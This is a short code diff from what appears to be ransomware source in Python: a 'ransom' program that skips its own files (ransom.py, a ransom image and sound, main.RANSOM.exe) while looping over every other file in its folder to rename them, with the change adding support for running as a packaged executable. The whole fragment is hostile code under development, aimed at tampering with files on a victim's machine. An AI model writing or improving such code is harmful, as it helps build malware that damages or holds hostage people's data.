@@ -52,7 +52,11 @@ def move_window(_window):
 script_files = ["ransom.py", "Ransom.png", "Ransom theme.wav", "main.spec", "icon.webp", "main.RANSOM.exe"]
 original_names = {}
 
-file_path = Path(__file__).parent
+if getattr(sys, "frozen", False):
+    file_path = Path(sys.executable).parent
+else:
+    file_path = Path(__file__).parent
+    
 for file in file_path.iterdir():
     if file.is_file() and file.name not in script_files:
         new = file.with_name(
